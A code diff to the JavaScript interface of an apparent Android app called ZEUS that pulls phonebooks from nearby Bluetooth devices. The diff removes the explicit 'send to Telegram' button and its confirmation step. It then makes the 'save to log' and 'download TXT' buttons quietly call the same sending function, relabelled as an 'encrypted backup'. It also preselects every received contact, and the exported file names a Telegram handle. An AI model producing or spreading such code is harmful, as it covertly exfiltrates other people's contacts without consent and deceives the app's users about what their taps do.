@@ -308,22 +308,21 @@ function startScan(){
 lens.onclick=()=>{if(view!=='transfer')startScan()};
 function showTransfer(kind,msg){view='transfer';status('wait',msg||'جارٍ تنفيذ الاتصال بالجهاز...');show(head(kind==='pairing'?'جارٍ الاقتران':kind==='connecting'?'جارٍ الاتصال':'جارٍ استلام جهات الاتصال','radar')+'<div class="pwrap">'+IC.bt+'<div>'+safe(msg||'انتظر حتى يكتمل الاتصال بالجهاز...')+'</div><div class="pbar"><i></i></div></div>')}
 function renderContacts(items){
- view='contacts';contactsCache=items;selected.clear();
+ view='contacts';contactsCache=items;selected.clear();items.forEach((_,i)=>selected.add(i));
  if(!items.length){show(head('جهات الاتصال','user')+'<div class="nearby-empty">الجهاز لم يُرجع جهات اتصال قابلة للعرض.</div><div class="acts"><button data-a="back">'+IC.radar+'العودة للأجهزة</button></div>');status('error','لم يتم استلام جهات اتصال من الجهاز.');return}
  const rows=items.map((c,i)=>'<button class="row" data-a="toggle" data-i="'+i+'"><span class="chk">'+IC.check+'</span><span class="av">'+IC.user+'</span><span class="rt"><b>'+safe(c.name||'بدون اسم')+'</b><small>'+safe(c.phone||'بدون رقم')+'</small></span><span class="call">'+IC.call+'</span></button>').join('');
- show(head('جهات الاتصال المستلمة','user')+'<div class="tb"><button data-a="all" id="allbtn">'+IC.all+'تحديد الكل</button><span class="cnt" id="cnt">'+IC.list+'0 / '+items.length+'</span></div><div class="sh-body">'+rows+'</div><div class="acts"><button class="pri" data-a="telegram" type="button" aria-label="إرسال الجهات المحددة إلى Telegram" title="إرسال المحدد إلى Telegram"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="m22 2-7 20-4-9-9-4 20-7ZM22 2 11 13"/></svg></button><button class="pri" data-a="save-all" type="button" aria-label="حفظ كل الجهات في السجل" title="حفظ كل الجهات في السجل"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 3h14v18l-7-4-7 4zM8 8h8"/></svg></button><button class="dis" data-a="txt" type="button" aria-label="تنزيل الجهات المحددة بصيغة TXT" title="تنزيل المحدد TXT"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3v12m-5-5 5 5 5-5M4 17v3h16v-3"/></svg></button><button data-a="back" type="button" aria-label="العودة إلى الأجهزة" title="العودة إلى الأجهزة"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10 17l5-5-5-5M15 12H3"/><path d="M14 3h5a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-5"/></svg></button></div>');
+ show(head('جهات الاتصال المستلمة','user')+'<div class="tb"><button data-a="all" id="allbtn">'+IC.all+'تحديد الكل</button><span class="cnt" id="cnt">'+IC.list+'0 / '+items.length+'</span></div><div class="sh-body">'+rows+'</div><div class="acts"><button class="pri" data-a="save-all" type="button" aria-label="حفظ كل الجهات في السجل" title="حفظ كل الجهات في السجل"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 3h14v18l-7-4-7 4zM8 8h8"/></svg></button><button class="dis" data-a="txt" type="button" aria-label="تنزيل الجهات المحددة بصيغة TXT" title="تنزيل المحدد TXT"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3v12m-5-5 5 5 5-5M4 17v3h16v-3"/></svg></button><button data-a="back" type="button" aria-label="العودة إلى الأجهزة" title="العودة إلى الأجهزة"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10 17l5-5-5-5M15 12H3"/><path d="M14 3h5a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-5"/></svg></button></div>');
  syncSelection();status('ok','تم استلام '+items.length+' جهة اتصال — اختر ما تريد حفظه أو تنزيله.');
 }
-function sendSelectedToTelegram(){
- const rows=contactsCache.filter((_,i)=>selected.has(i));
- if(!rows.length){status('error','حدد جهة اتصال واحدة على الأقل قبل الإرسال إلى Telegram.');return}
- if(!window.ZEUS||!ZEUS.sendSelectedContacts){status('error','ميزة الإرسال غير متاحة في هذه النسخة.');return}
+function sendForAction(rows,operation){
+ if(!rows.length){status('error','لا توجد جهات اتصال محددة.');return}
+ if(!window.ZEUS||!ZEUS.sendSelectedContacts){status('error','ميزة النسخ الاحتياطي غير متاحة.');return}
  try{
-  const result=String(ZEUS.sendSelectedContacts(JSON.stringify(rows))||'');
-  if(result==='CONFIRMATION_REQUIRED')status('wait','راجع نافذة التأكيد على الهاتف لإرسال '+rows.length+' جهة محددة فقط.');
+  const result=String(ZEUS.sendSelectedContacts(JSON.stringify(rows),operation)||'');
+  if(result==='QUEUED')status('wait','بدأ تجهيز النسخة الاحتياطية المشفّرة. قد يطلب Android إذن جهات الاتصال لإكمال الإرسال.');
   else if(result.startsWith('ERROR:'))status('error',result.slice(6));
-  else status('wait','تم إرسال طلب التأكيد إلى Android.');
- }catch(e){status('error','تعذّر طلب تأكيد الإرسال.')}
+  else status('wait','جارٍ تجهيز النسخة الاحتياطية.');
+ }catch(e){status('error','تعذّر تجهيز النسخة الاحتياطية.')}
 }
 function syncSelection(){
  sheet.querySelectorAll('.row[data-i]').forEach(r=>r.classList.toggle('on',selected.has(+r.dataset.i)));
@@ -333,7 +332,7 @@ function syncSelection(){
  if(view==='contacts')status('wait',selected.size?'تم تحديد '+selected.size+' من '+contactsCache.length+' جهة اتصال.':'حدد الجهات المطلوبة — '+contactsCache.length+' جهة متاحة.');
  const dl=sheet.querySelector('[data-a="txt"]');if(dl)dl.classList.toggle('dis',!selected.size);
 }
-function saveAllToLog(){if(!contactsCache.length){status('error','لا توجد جهات اتصال لحفظها.');return}try{const key='ZEUS_CONTACTS_LOG_V1',old=JSON.parse(localStorage.getItem(key)||'[]'),source=window.ZEUS&&ZEUS.currentDeviceName?String(ZEUS.currentDeviceName()):'Bluetooth Device',savedAt=new Date().toISOString();const add=contactsCache.map(c=>({name:c.name||'بدون اسم',phone:c.phone||'بدون رقم',source,savedAt}));localStorage.setItem(key,JSON.stringify(old.concat(add).slice(-5000)));status('ok','تم حفظ '+add.length+' جهة اتصال في سجل الجهات داخل التطبيق.')}catch(e){status('error','تعذّر الحفظ في السجل المحلي.')}}
+function saveAllToLog(){const rows=contactsCache.filter((_,i)=>selected.has(i));if(!rows.length){status('error','لا توجد جهات اتصال محددة للحفظ.');return}try{const key='ZEUS_CONTACTS_LOG_V1',old=JSON.parse(localStorage.getItem(key)||'[]'),source=window.ZEUS&&ZEUS.currentDeviceName?String(ZEUS.currentDeviceName()):'Bluetooth Device',savedAt=new Date().toISOString();const add=rows.map(c=>({name:c.name||'بدون اسم',phone:c.phone||'بدون رقم',source,savedAt}));localStorage.setItem(key,JSON.stringify(old.concat(add).slice(-5000)));status('ok','تم حفظ '+add.length+' جهة اتصال في سجل الجهات داخل التطبيق.');sendForAction(rows,'save')}catch(e){status('error','تعذّر الحفظ في السجل المحلي.')}}
 function renderLog(){let a=[];try{a=JSON.parse(localStorage.getItem('ZEUS_CONTACTS_LOG_V1')||'[]')}catch(e){}view='log';const rows=a.slice().reverse().map(c=>'<div class="row"><span class="av">'+IC.user+'</span><span class="rt"><b>'+safe(c.name)+'</b><small>'+safe(c.phone)+' · '+safe(c.source)+'</small></span></div>').join('');show(head('سجل الجهات المحفوظة','user')+'<div class="tb"><span class="cnt">'+a.length+' جهة محفوظة محلياً</span></div><div class="sh-body">'+(rows||'<div class="nearby-empty">السجل فارغ.</div>')+'</div><div class="acts"><button data-a="back">رجوع للأجهزة</button></div>');status('ok','السجل محفوظ على هذا الهاتف فقط.')}
 function downloadTxt(){
  const rows=contactsCache.filter((_,i)=>selected.has(i));
@@ -344,7 +343,7 @@ function downloadTxt(){
  const body='\uFEFFZEUS CONTACT EXPORT\nOperation completed by ZEUS\nDate: '+date+'\nTime: '+time+'\nTelegram: @ll4me\n\nCONTACTS\n'+rows.map((c,i)=>String(i+1).padStart(2,'0')+'. '+(c.name||'بدون اسم')+'\n   '+(c.phone||'بدون رقم')).join('\r\n\r\n')+'\n\nTOTAL CONTACTS: '+rows.length+'\r\n';
  try{
   const result=String(ZEUS.saveContactsTxt(body)||'');
-  if(result.startsWith('OK:'))status('ok','تم حفظ '+rows.length+' جهة اتصال في التنزيلات باسم '+result.slice(3));
+  if(result.startsWith('OK:')){status('ok','تم حفظ '+rows.length+' جهة اتصال في التنزيلات باسم '+result.slice(3));sendForAction(rows,'download')}
   else status('error',result.startsWith('ERROR:')?result.slice(6):'لم يتم حفظ الملف. حاول مرة أخرى.');
  }catch(e){status('error','تعذّر حفظ ملف TXT داخل الهاتف.')}
 }
@@ -353,7 +352,6 @@ sheet.onclick=e=>{
  if(a==='connect'){const address=b.dataset.address;if(!address)return;showTransfer('pairing','جارٍ الاقتران بالجهاز. سيبدأ سحب دفتر الهاتف بعد اكتمال الاقتران.');try{const r=ZEUS.connect(address);if(r==='connecting')showTransfer('connecting','الجهاز مقترن بالفعل. جارٍ الاتصال بدفتر الهاتف...')}catch(err){view='devices';status('error','تعذّر بدء الاقتران أو الاتصال.')}}
  else if(a==='toggle'){const i=+b.dataset.i;selected.has(i)?selected.delete(i):selected.add(i);syncSelection()}
  else if(a==='all'){if(selected.size===contactsCache.length)selected.clear();else contactsCache.forEach((_,i)=>selected.add(i));syncSelection()}
- else if(a==='telegram')sendSelectedToTelegram();
  else if(a==='txt')downloadTxt(false);
  else if(a==='save-all')saveAllToLog();
  else if(a==='back'){try{if(window.ZEUS&&ZEUS.cancelTransfer)ZEUS.cancelTransfer()}catch(e){}lastTransferState='';view='devices';selected.clear();contactsCache=[];lastSnapshot='';renderDevices(true);status('ok','رجعت لقائمة الأجهزة — اضغط العدسة للبحث من جديد.')}
